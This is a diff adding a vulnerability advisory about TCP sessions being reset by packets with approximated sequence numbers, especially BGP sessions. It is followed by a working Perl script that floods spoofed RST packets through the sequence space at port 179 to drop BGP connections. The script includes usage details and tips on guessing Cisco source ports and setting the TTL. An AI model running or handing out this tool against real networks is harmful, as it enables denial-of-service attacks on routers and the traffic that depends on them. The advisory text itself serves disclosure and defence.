@@ -1,0 +1,63 @@
+source: http://www.securityfocus.com/bid/10183/info
+ 
+A vulnerability in TCP implementations may permit unauthorized remote users to reset TCP sessions. This issue affects products released by multiple vendors. Exploiting this issue may permit remote attackers to more easily approximate TCP sequence numbers.
+ 
+The problem is that affected implementations will accept TCP sequence numbers within a certain range of the expected sequence number for a packet in the session. This will permit a remote attacker to inject a SYN or RST packet into the session, causing it to be reset and effectively allowing denial-of-service attacks. An attacker would exploit this issue by sending a packet to a receiving implementation with an approximated sequence number and a forged source IP and TCP port.
+ 
+Few factors may present viable target implementations, such as imlementations that:
+ 
+- depend on long-lived TCP connections
+- have known or easily guessed IP address endpoints
+- have known or easily guessed TCP source ports.
+ 
+Note that Border Gateway Protocol (BGP) is reported to be particularly vulnerable to this type of attack. As a result, this issue is likely to affect a number of routing platforms.
+ 
+Note also that while a number of vendors have confirmed this issue in various products, investigations are ongoing and it is likely that many other vendors and products will turn out to be vulnerable as the issue is investigated further.
+ 
+Other consequences may also result from this issue, such as injecting specific data in TCP sessions, but this has not been confirmed.
+ 
+**Update: Microsoft platforms are also reported prone to this vulnerability. Vendor reports indicate that an attacker will require knowledge of the IP address and port numbers of the source and destination of an existent legitimate TCP connection in order to exploit this vulnerability on Microsoft platforms. Connections that involve persistent sessions, for example Border Gateway Protocol sessions, may be more exposed to this vulnerability than other TCP/IP sessions.
+
+#!/usr/bin/perl
+#
+# Rich's BGP DOS!
+# version .02
+# Sends out RST flood to DOS BGP Connections
+#
+# Requires getopts.pl and Net:RawIP (http://www.ic.al.lg.ua/~ksv/)
+#
+#For this to work you must do a preceding scan to figure out what the source port and sequence number should be!
+#Cisco routers have a magic source port after reboot and all subsequent source ports are incremented by 1 or 512 depending on IOS
+#And also find out the hops to set the ttl w/ traceroute.  Per the RFC, the TTL must be 1 when it arrives at the router.
+#
+#
+
+require 'getopts.pl';
+use Net::RawIP;
+Getopts('s:p:d:t:x');
+$a = new Net::RawIP;
+die "Usage $0 -s <spoofed source> -p <source port> -d <destination> -t <ttl>" unless ($opt_s && $opt_p && $opt_d && $opt_t);
+
+$count=0;
+
+while ($count < 4294967296) {
+
+#Increment the count
+                $count=$count + 16384;
+
+#Create IP packet!
+                $a->set({ ip => 
+                        {saddr => $opt_s,
+                        daddr => $opt_d,
+                        ttl => $opt_t
+                        },
+#Another TCP port could be specified here to do DOSes on other TCP services.  BGP is 179
+                        tcp=> {dest => 179,
+                        source => $opt_p,
+                        window =>  16384,
+                        seq => $count,
+                        rst => 1}
+                        });
+#Send it out!
+                $a->send;
+}
